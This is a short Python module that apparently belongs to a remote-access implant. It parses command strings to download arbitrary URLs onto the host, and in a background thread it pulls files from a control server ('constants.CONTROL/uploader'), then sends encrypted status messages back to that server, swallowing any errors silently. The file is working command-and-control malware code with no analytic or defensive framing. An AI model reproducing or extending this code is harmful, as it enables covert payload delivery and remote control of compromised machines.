import requests
import constants
import threading
import pyutils.encryption_utils as eu

def download_from_web(message):
    try:
        parts = message.split(" ")
        dest_dir = "./"
        url = parts[1]
        filename = parts[2]
        if len(parts) >= 4: dest_dir = parts[3]
        if not (dest_dir.endswith("/") or dest_dir.endswith("\\")): dest_dir += "/"

        with requests.get(url, stream=True) as response:
            response.raise_for_status()
            with open(f"{dest_dir}{filename}", 'wb') as f:
                for chunk in response.iter_content(chunk_size=8192):
                    f.write(chunk)

        return f"Successfully downloaded {dest_dir}{filename}"
    except Exception as e: return f"Error in download_from_web(): {e}"

def upload_helper(filename, dest):
    try:
        url = f"{constants.CONTROL}/uploader"
        with requests.get(url, stream=True) as response:
            response.raise_for_status()
            with open(f"{dest}{filename}", 'wb') as f:
                for chunk in response.iter_content(chunk_size=8192):
                    f.write(chunk)

        requests.post(constants.CONTROL, data=eu.encrypt1(f"Successfully downloaded {dest}{filename}"))
    except Exception: pass

def upload_command(message):
    try:
        parts = message.split(" ")
        dest_dir = "./"
        filename = parts[2]
        if len(parts) >= 4: dest_dir = parts[3]
        if not (dest_dir.endswith("/") or dest_dir.endswith("\\")): dest_dir += "/"

        t = threading.Thread(target=upload_helper, args=(filename, dest_dir))
        t.start()

        return f"Successfully started download thread for {dest_dir}{filename}"
    
    except Exception as e: return f"Error in upload_command(): {e}"